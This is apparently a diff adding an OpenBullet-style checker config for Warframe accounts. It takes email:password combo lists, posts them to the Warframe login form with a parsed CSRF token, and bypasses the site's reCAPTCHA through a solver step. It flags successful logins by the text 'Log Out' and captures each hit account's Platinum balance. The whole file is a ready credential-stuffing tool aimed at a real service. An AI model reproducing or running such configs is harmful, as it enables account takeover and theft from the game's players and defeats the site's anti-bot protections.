@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "Warframe",
+  "SuggestedBots": 5,
+  "LastModified": "2018-05-09T17:22:54.1481994+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://www.warframe.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_TOKEN PARSE "<SOURCE>" CSS "[name=_token]" "value" 0 -> VAR "TOKEN" "" "" 
+#LOGIN REQUEST POST "https://www.warframe.com/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>&_token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.warframe.com/login" 
+  HEADER "origin: https://www.warframe.com" 
+#CHECK_IF_SOMETHING_FAILED KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "The password field is required" 
+    KEY "The email field is required" 
+RECAPTCHA "https://www.warframe.com/robot-check" "6Lc2TRUTAAAAACMNZEkxOp3dsz4Z9CuLye7HRFJg" -> VAR "RECAP" 
+#SEND_ROBOT_CHECK REQUEST POST "https://www.warframe.com/robot-check" AutoRedirect=TRUE 
+  CONTENT "g-recaptcha-response=<RECAP>&_token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.warframe.com/robot-check" 
+  HEADER "origin: https://www.warframe.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Login Failed" 
+  KEYCHAIN Success OR 
+    KEY "Log Out" 
+#GET_USER_INFO REQUEST GET "https://www.warframe.com/user" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.warframe.com/" 
+#CAPTURE_PLAT PARSE "<SOURCE>" CSS "#changeEmailSubscription > div.three.columns > ul > li:nth-child(1) > div.accountVal" "innerHTML" 0 -> CAP "Platinum" "" "" 
